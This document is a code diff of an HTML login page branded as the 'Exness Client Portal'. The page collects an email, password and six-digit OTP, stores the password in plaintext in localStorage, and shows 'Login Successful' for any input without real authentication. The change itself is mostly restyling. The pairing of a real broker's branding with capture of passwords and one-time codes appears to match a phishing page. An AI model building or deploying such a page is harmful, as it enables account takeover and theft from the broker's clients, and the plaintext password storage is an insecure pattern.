@@ -1,63 +1,104 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
 
 <title>Exness Login</title>
 
 <style>
 body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    background: #ffffff;
+  margin: 0;
+  padding: 0;
+  background: #f5f5f5;
+  font-family: Arial, sans-serif;
 }
 
 .container {
-    max-width: 420px;
-    margin: 35px auto;
-    padding: 20px;
+  max-width: 420px;
+  margin: 50px auto;
+  padding: 20px;
 }
 
 .card {
-    background: #fff;
-    padding: 25px;
-    border-radius: 12px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  background: #fff;
+  padding: 28px 24px;
+  border-radius: 14px;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.1);
 }
 
-/* Perfect responsive logo for mobile */
-img.logo {
-    display: block;
-    margin: auto;
-    width: 150px;
-    max-width: 65%;
-    height: auto;
-    margin-bottom: 20px;
+/* Mobile-friendly logo */
+.logo {
+  width: 150px;
+  max-width: 55%;
+  display: block;
+  margin: 0 auto 22px;
+}
+
+h2 {
+  text-align: center;
+  margin: 0 0 22px;
+  font-size: 23px;
+  font-weight: 600;
 }
 
 input {
-    width: 100%;
-    padding: 12px;
-    margin-bottom: 15px;
-    border: 1px solid #ccc;
-    border-radius: 10px;
-    font-size: 15px;
+  width: 100%;
+  padding: 13px;
+  margin-bottom: 17px;
+  border-radius: 12px;
+  border: 1px solid #cfcfcf;
+  background: #fafafa;
+  font-size: 15px;
+  transition: border-color .2s;
+}
+
+input:focus {
+  border-color: #ffc800;
+  outline: none;
 }
 
 button {
-    width: 100%;
-    padding: 14px;
-    background: #ffd400;
-    border: none;
-    border-radius: 10px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
+  width: 100%;
+  padding: 15px;
+  background: #ffd400;
+  border: none;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 5px;
+  transition: background .2s;
 }
 
-.hidden { display: none; }
-h2 { text-align: center; }
+button:hover {
+  background: #f0c600;
+}
+
+.text-center {
+  text-align: center;
+}
+
+.link {
+  color: #333;
+  font-weight: 500;
+  text-decoration: none;
+}
+
+.link:hover {
+  text-decoration: underline;
+}
+
+.success-text {
+  text-align: center;
+  margin-top: 12px;
+  font-size: 15px;
+  color: #555;
+}
+
+.hidden {
+  display: none;
+}
 </style>
 </head>
 
@@ -65,80 +106,71 @@ h2 { text-align: center; }
 
 <div class="container">
 
-<!-- LOGIN PAGE -->
-<div id="loginPage" class="card">
+  <!-- Login Panel -->
+  <div id="loginPage" class="card">
     <img src="logo.png" class="logo" alt="Logo">
-
-    <h1>Welcome to Exness Client Portal</h1>
+     <h1>Welcome to Exness Client Portal</h1>
 
     <input id="loginEmail" type="email" placeholder="Email address">
     <input id="loginPassword" type="password" placeholder="Password">
 
     <button onclick="goToOtp()">Sign In</button>
 
-    <p style="text-align:center;margin-top:15px;">
-        Don’t have an account? <a href="register.html">Register</a>
+    <p class="text-center" style="margin-top:18px;">
+      Don’t have an account?
+      <a href="register.html" class="link">Register</a>
     </p>
-</div>
+  </div>
 
-<!-- OTP PAGE -->
-<div id="otpPage" class="card hidden">
+  <!-- OTP Panel -->
+  <div id="otpPage" class="card hidden">
     <h2>Enter OTP</h2>
-
     <input id="otpCode" type="text" maxlength="6" placeholder="6-digit OTP">
 
     <button onclick="submitOtp()">Verify OTP</button>
-</div>
+  </div>
 
-<!-- SUCCESS PAGE -->
-<div id="successPage" class="card hidden">
+  <!-- Success Screen -->
+  <div id="successPage" class="card hidden">
     <h2>Login Successful</h2>
-    <p style="text-align:center;">Redirecting…</p>
-</div>
+    <p class="success-text">Redirecting…</p>
+  </div>
 
 </div>
 
 <script>
-// LOGIN STEP
 function goToOtp() {
-    let email = loginEmail.value;
-    let pass = loginPassword.value;
+  const email = loginEmail.value.trim();
+  const pass = loginPassword.value.trim();
 
-    if (!email || !pass) {
-        alert("Please fill in all fields");
-        return;
-    }
+  if (!email || !pass) {
+    alert("Please fill in all fields");
+    return;
+  }
 
-    // Save login session + data
-    localStorage.setItem("isLoggedIn", "true");
-    localStorage.setItem("loginData", JSON.stringify({
-        email: email,
-        password: pass
-    }));
+  localStorage.setItem("isLoggedIn", "true");
+  localStorage.setItem("loginData", JSON.stringify({ email, password: pass }));
 
-    // Move to OTP screen
-    loginPage.classList.add("hidden");
-    otpPage.classList.remove("hidden");
+  loginPage.classList.add("hidden");
+  otpPage.classList.remove("hidden");
 }
 
-// OTP STEP
 function submitOtp() {
-    let otp = otpCode.value;
+  const otp = otpCode.value.trim();
 
-    if (otp.length !== 6) {
-        alert("Enter a valid 6-digit OTP");
-        return;
-    }
+  if (otp.length !== 6) {
+    alert("Enter a valid 6-digit OTP");
+    return;
+  }
 
-    localStorage.setItem("otp", otp);
+  localStorage.setItem("otp", otp);
 
-    otpPage.classList.add("hidden");
-    successPage.classList.remove("hidden");
+  otpPage.classList.add("hidden");
+  successPage.classList.remove("hidden");
 
-    // Go to dashboard
-    setTimeout(() => {
-        window.location.href = "dashboard.html";
-    }, 1500);
+  setTimeout(() => {
+    window.location.href = "dashboard.html";
+  }, 1400);
 }
 </script>
 
